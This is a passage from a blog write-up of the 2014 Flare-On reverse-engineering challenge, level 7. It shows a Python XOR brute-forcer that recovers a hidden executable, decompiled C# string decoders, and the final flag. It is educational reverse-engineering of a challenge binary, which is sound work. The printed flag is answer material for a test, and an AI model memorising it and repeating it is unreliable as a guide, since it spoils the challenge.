</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key13[ind13])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key14[ind14])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,<span style=color:#2aa198>&#39;backdoge.exe&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                              decodedfilename <span style=color:#719e07>=</span> <span style=color:#2aa198>&#34;c:</span><span style=color:#cb4b16>\\</span><span style=color:#2aa198>gratz&#34;</span> <span style=color:#719e07>+</span> <span style=color:#b58900>str</span>(counter) <span style=color:#719e07>+</span> <span style=color:#2aa198>&#34;.exe&#34;</span>
</span></span><span style=display:flex><span>                              decodedfile <span style=color:#719e07>=</span> file(decodedfilename,<span style=color:#2aa198>&#39;wb&#39;</span>)
</span></span><span style=display:flex><span>                              decodedfile<span style=color:#719e07>.</span>write(out)
</span></span><span style=display:flex><span>                              decodedfile<span style=color:#719e07>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                            <span style=color:#586e75># be sure to reset the wholefile after reading it, thanks Curtis :)                                                                  </span>
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> wholefile[:<span style=color:#2aa198>0x10</span>]
</span></span><span style=display:flex><span>                            counter <span style=color:#719e07>+=</span><span style=color:#2aa198>1</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>It's a bad bruteforcer but it does the job. To speed things up, it only performs the xor-es with the first <code>0x80</code> bytes of the binary which is the <code>DOS Stub</code>. In the end, it compares the first two bytes with <code>MZ</code> and then xor-es the whole binary before writing it to a file.</p><p>I got two files and after opening them in hex editors, one was clearly a false positive. I executed the correct binary.</p><p><img src=/images/2014/flare/7-23.jpg alt="Almost done" title="Almost done"></p><p>But we cannot see the email. Augh. This is a .NET application. We need to decompile it like the first challenge.</p><figure class=code><figcaption><span>Decompiled gratz.exe</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c# data-lang=c#><span style=display:flex><span><span style=color:#268bd2>public</span> Form1()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#719e07>this</span>.InitializeComponent();
</span></span><span style=display:flex><span>  <span style=color:#719e07>new</span> Thread(<span style=color:#719e07>new</span> ThreadStart(<span style=color:#719e07>this</span>.lulzors)).Start();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#268bd2>public</span> <span style=color:#719e07>void</span> lulzors()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  lulz lulz = <span style=color:#719e07>new</span> lulz();
</span></span><span style=display:flex><span>  Thread thread = <span style=color:#719e07>new</span> Thread(<span style=color:#719e07>new</span> ThreadStart(lulz.datwork));
</span></span><span style=display:flex><span>  thread.Start();
</span></span><span style=display:flex><span>  <span style=color:#719e07>do</span>
</span></span><span style=display:flex><span>    ;
</span></span><span style=display:flex><span>  <span style=color:#719e07>while</span> (thread.IsAlive);
</span></span><span style=display:flex><span>  <span style=color:#719e07>this</span>.label2.Text = lulz.decoder4(<span style=color:#2aa198>&#34;\v\fP\x000E\x000FBA\x0006\rG\x0015I\x001A\x0001\x0016H\\\t\b\x0002\x0013/\b\t^\x001D\bJO\a]C\x001B\x0005&#34;</span>);
</span></span><span style=display:flex><span>}</span></span></code></pre></td></tr></table></div></div></div></figure><p>And inside <code>lulz.cs</code>.</p><figure class=code><figcaption><span>lulz.cs</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c# data-lang=c#><span style=display:flex><span><span style=color:#586e75>// decoder1 and decoder3 omitted</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#268bd2>public</span> <span style=color:#dc322f>string</span> decoder2(<span style=color:#dc322f>string</span> encoded)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#dc322f>string</span> str1 = <span style=color:#2aa198>&#34;&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#dc322f>string</span> str2 = <span style=color:#2aa198>&#34;this&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#719e07>for</span> (<span style=color:#dc322f>int</span> index = <span style=color:#2aa198>0</span>; index &lt; encoded.Length; ++index)
</span></span><span style=display:flex><span>    str1 = str1 + (<span style=color:#dc322f>object</span>) (<span style=color:#dc322f>char</span>) ((<span style=color:#dc322f>uint</span>) encoded[index] ^ (<span style=color:#dc322f>uint</span>) str2[index % str2.Length]);
</span></span><span style=display:flex><span>  <span style=color:#719e07>return</span> str1;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#268bd2>public</span> <span style=color:#dc322f>string</span> decoder4(<span style=color:#dc322f>string</span> encoded)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#dc322f>string</span> str1 = <span style=color:#2aa198>&#34;&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#dc322f>string</span> str2 = <span style=color:#719e07>this</span>.decoder2(<span style=color:#2aa198>&#34;\x001B\x0005\x000ES\x001D\x001BI\a\x001C\x0001\x001AS\0\0\fS\x0006\r\b\x001FT\a\a\x0016K&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#719e07>for</span> (<span style=color:#dc322f>int</span> index = <span style=color:#2aa198>0</span>; index &lt; encoded.Length; ++index)
</span></span><span style=display:flex><span>    str1 = str1 + (<span style=color:#dc322f>object</span>) (<span style=color:#dc322f>char</span>) ((<span style=color:#dc322f>uint</span>) encoded[index] ^ (<span style=color:#dc322f>uint</span>) str2[index % str2.Length]);
</span></span><span style=display:flex><span>  <span style=color:#719e07>return</span> str1;
</span></span><span style=display:flex><span>}</span></span></code></pre></td></tr></table></div></div></div></figure><p>We can either write code or paste it into an online C# compiler. In the end we have the flag:</p><h4 id=level-7-flag>Level 7 flag: <a href=mailto:da7.f1are.finish.lin3@flare-on.com>da7.f1are.finish.lin3@flare-on.com</a>
<a class=header-link href=#level-7-flag><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><p>And the email:</p><pre tabindex=0><code>Alright, we give in. You&#39;ve done it. Your reversing-fu is strong.
I&#39;ll pass your info on to the FLARE team and someone will be in touch.
-FLARE
</code></pre></div><footer><p class=meta><span class="byline author vcard">Posted by <span class=fn>Parsia</span></span><time>Sep 23, 2014</time>
<span class=categories>Tags:<a class=category href=https://parsiya.net/tags/flareon>FlareOn</a> <a class=category href=https://parsiya.net/tags/fireeye>FireEye</a> <a class=category href=https://parsiya.net/tags/python>Python</a></span></p><p class=meta><a class="basic-alignment left" href=https://parsiya.net/blog/2014-09-21-malware-adventure/ title="Malware Adventure">Malware Adventure</a>
<a class="basic-alignment right" href=https://parsiya.net/blog/2014-11-18-building-memfetch-on-kali--comments/ title="Building memfetch on Kali + Comments">Building memfetch on Kali + Comments</a></p><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//parsiya.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></footer></article></div><aside class="sidebar thirds"><section class="first odd"><h1>Who am I?</h1><p><p>I am Parsia, a security engineer at Microsoft.</p><p>I write about application security, cryptography, static analysis, and
(of course) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more.</p></p></section><ul class=sidebar-nav><li class=sidebar-nav-item><a target=_blank rel="me noopener noreferrer" href=https://infosec.exchange/@parsiya title=https://infosec.exchange/@parsiya><i class="fa fa-mastodon fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a></li></ul><section class=odd><h1>Collections</h1><li><a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a></li><li><a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a></li><li><a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a></li><li><a href=https://parsiya.net/categories/static-analysis/ title="Static Analysis">Static Analysis</a></li><li><a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a></li><li><a href=https://parsiya.net/categories/blockchain/ title="Blockchain (lol)">Blockchain (lol)</a></li><li><a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a></li><li><a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a></li><li><a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a></li><li><a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a></li><li><a href=https://parsiya.net/categories/winappdbg/ title="WinAppDbg (use Frida instead)">WinAppDbg (use Frida instead)</a></li><li><a href=https://awsome.pw title='AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability'>AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability</a></li></section></aside></div></div><footer role=contentinfo><p>Copyright &copy; 2025 Parsia - <a href=https://parsiya.net/license/>License</a> -
<span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.</p></footer></body></html>